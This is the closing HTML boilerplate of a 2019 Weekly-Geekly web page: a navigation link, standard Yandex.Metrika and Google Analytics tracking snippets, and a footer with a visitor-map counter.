<li><a href="../322846/index.html">Corporate software navigator: there is always a choice</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>